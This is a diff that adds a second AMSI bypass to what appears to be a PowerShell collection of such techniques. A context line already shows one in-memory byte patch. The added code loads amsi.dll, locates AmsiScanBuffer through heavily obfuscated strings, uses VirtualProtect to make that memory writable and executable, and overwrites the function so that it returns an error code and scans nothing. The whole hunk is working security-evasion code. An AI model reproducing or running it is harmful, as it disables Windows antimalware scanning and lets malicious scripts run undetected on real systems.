@@ -22,3 +22,33 @@ $replace = ‘VirtualProtec’
 $stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
 $marshalClass = [System.Runtime.InteropServices.Marshal]
 $marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
+
+==============================================================================================================================
+
+$kizax = @"
+using System;
+using System.Runtime.InteropServices;
+public class kizax {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr yjnqcb, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $kizax
+
+$rykogwu = [kizax]::LoadLibrary("$(('àm'+'sî'+'.d'+'ll').noRMaLiZe([CHAr]([BYte]0x46)+[ChAr]([BYTE]0x6f)+[chAR]([BYTe]0x72)+[Char](109*8/8)+[chaR](68*31/31)) -replace [cHaR](92+76-76)+[cHaR]([byTE]0x70)+[cHar](107+16)+[chAr]([BYtE]0x4d)+[char]([BytE]0x6e)+[cHAr]([byTe]0x7d))")
+$iyslea = [kizax]::GetProcAddress($rykogwu, "$(('ÃmsîScân'+'Buffer').normaliZe([ChAr]([bYTe]0x46)+[CHaR]([byte]0x6f)+[chAR]([BYTE]0x72)+[cHar]([byte]0x6d)+[chaR]([byTe]0x44)) -replace [char]([bYTe]0x5c)+[char](112*56/56)+[CHAR](123)+[CHAr](75+2)+[char](94+16)+[ChAR]([ByTE]0x7d))")
+$p = 0
+[kizax]::VirtualProtect($iyslea, [uint32]5, 0x40, [ref]$p)
+$aapt = "0xB8"
+$qkwf = "0x57"
+$snxi = "0x00"
+$wnan = "0x07"
+$nchj = "0x80"
+$yywa = "0xC3"
+$estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
+[System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)
